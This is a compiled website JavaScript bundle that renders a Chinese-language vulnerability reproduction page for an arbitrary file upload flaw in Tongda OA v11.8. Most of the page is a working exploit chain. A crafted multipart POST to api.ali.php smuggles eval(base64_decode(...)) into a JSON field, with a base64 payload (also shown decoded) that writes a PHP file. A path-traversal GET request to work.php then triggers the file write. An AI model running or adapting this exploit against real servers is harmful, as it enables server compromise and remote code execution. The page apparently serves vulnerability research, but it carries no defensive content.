(window.webpackJsonp=window.webpackJsonp||[]).push([[110],{1719:function(t,a,s){t.exports=s.p+"assets/img/1628303888717-4ffc91a6-e87e-4e00-8bd5-b2218bb0772a.70c7bdb3.png"},1720:function(t,a,s){t.exports=s.p+"assets/img/1630513004438-e5a73ef6-8d65-40a1-9a3c-3be30cd7d164.da74a076.png"},1721:function(t,a,s){t.exports=s.p+"assets/img/1630513044174-8139c404-4f11-404e-be04-42d86b407bdd.420a6145.png"},1722:function(t,a,s){t.exports=s.p+"assets/img/1630513283771-36cc86c7-a150-4834-be64-243b20938165.83dcea54.png"},2763:function(t,a,s){"use strict";s.r(a);var r=s(75),n=Object(r.a)({},(function(){var t=this,a=t.$createElement,r=t._self._c||a;return r("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[r("h1",{attrs:{id:"通达oa-v11-8-api-ali-php-任意文件上传漏洞"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#通达oa-v11-8-api-ali-php-任意文件上传漏洞"}},[t._v("#")]),t._v(" 通达OA v11.8 api.ali.php 任意文件上传漏洞")]),t._v(" "),r("h2",{attrs:{id:"漏洞描述"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),r("p",[t._v("通达OA v11.8 api.ali.php 存在任意文件上传漏洞，攻击者通过漏可以上传恶意文件控制服务器")]),t._v(" "),r("h2",{attrs:{id:"漏洞影响"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),r("a-checkbox",{attrs:{checked:""}},[t._v("通达OA v11.8")]),r("br"),t._v(" "),r("h2",{attrs:{id:"漏洞复现"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),r("p",[t._v("登陆页面")]),t._v(" "),r("p",[r("img",{attrs:{src:s(1719),alt:"img"}})]),t._v(" "),r("p",[t._v("像 api.ali.php 发送请求包")]),t._v(" "),r("div",{staticClass:"language-python line-numbers-mode"},[r("pre",{pre:!0,attrs:{class:"language-python"}},[r("code",[t._v("POST "),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("mobile"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("api"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("api"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("ali"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("php HTTP"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),r("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" \nUser"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Agent"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" Go"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("http"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("client"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),r("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nContent"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Length"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[t._v("422")]),t._v("\nContent"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Type"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" multipart"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("form"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("data"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" boundary"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("502f67681799b07e4de6b503655f5cae\nAccept"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Encoding"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" gzip\n\n"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("502f67681799b07e4de6b503655f5cae\nContent"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Disposition"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" form"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("data"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" name"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),r("span",{pre:!0,attrs:{class:"token string"}},[t._v('"file"')]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" filename"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),r("span",{pre:!0,attrs:{class:"token string"}},[t._v('"fb6790f4.json"')]),t._v("\nContent"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Type"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" application"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("octet"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("stream\n\n"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),r("span",{pre:!0,attrs:{class:"token string"}},[t._v('"modular"')]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),r("span",{pre:!0,attrs:{class:"token string"}},[t._v('"AllVariable"')]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),r("span",{pre:!0,attrs:{class:"token string"}},[t._v('"a"')]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),r("span",{pre:!0,attrs:{class:"token string"}},[t._v('"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw=="')]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),r("span",{pre:!0,attrs:{class:"token string"}},[t._v('"dataAnalysis"')]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),r("span",{pre:!0,attrs:{class:"token string"}},[t._v('"{\\"a\\":\\"錦\',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\\"}"')]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("502f67681799b07e4de6b503655f5cae"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("\n")])]),t._v(" "),r("div",{staticClass:"line-numbers-wrapper"},[r("span",{staticClass:"line-number"},[t._v("1")]),r("br"),r("span",{staticClass:"line-number"},[t._v("2")]),r("br"),r("span",{staticClass:"line-number"},[t._v("3")]),r("br"),r("span",{staticClass:"line-number"},[t._v("4")]),r("br"),r("span",{staticClass:"line-number"},[t._v("5")]),r("br"),r("span",{staticClass:"line-number"},[t._v("6")]),r("br"),r("span",{staticClass:"line-number"},[t._v("7")]),r("br"),r("span",{staticClass:"line-number"},[t._v("8")]),r("br"),r("span",{staticClass:"line-number"},[t._v("9")]),r("br"),r("span",{staticClass:"line-number"},[t._v("10")]),r("br"),r("span",{staticClass:"line-number"},[t._v("11")]),r("br"),r("span",{staticClass:"line-number"},[t._v("12")]),r("br"),r("span",{staticClass:"line-number"},[t._v("13")]),r("br")])]),r("a-checkbox",{attrs:{checked:""}},[t._v("参数a base解码")]),r("br"),t._v(" "),r("a-checkbox",{attrs:{checked:""}},[t._v("ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==file_put_contents('../../fb6790f4.php','<?php phpinfo();?>');")]),r("br"),t._v(" "),r("p",[r("img",{attrs:{src:s(1720),alt:"img"}})]),t._v(" "),r("p",[t._v("再发送GET请求写入文件")]),t._v(" "),r("div",{staticClass:"language-python line-numbers-mode"},[r("pre",{pre:!0,attrs:{class:"language-python"}},[r("code",[r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("inc"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("package"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("work"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("php?"),r("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("id")]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("myoa"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("attach"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("approve_center"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),r("span",{pre:!0,attrs:{class:"token number"}},[t._v("2109")]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("fb6790f4\n")])]),t._v(" "),r("div",{staticClass:"line-numbers-wrapper"},[r("span",{staticClass:"line-number"},[t._v("1")]),r("br")])]),r("p",[r("img",{attrs:{src:s(1721),alt:"img"}})]),t._v(" "),r("p",[t._v("其中请求中对 2109 为 年月,路径为 "),r("code",[t._v("/fb6790f4.php,")])]),t._v(" "),r("p",[r("img",{attrs:{src:s(1722),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=n.exports}}]);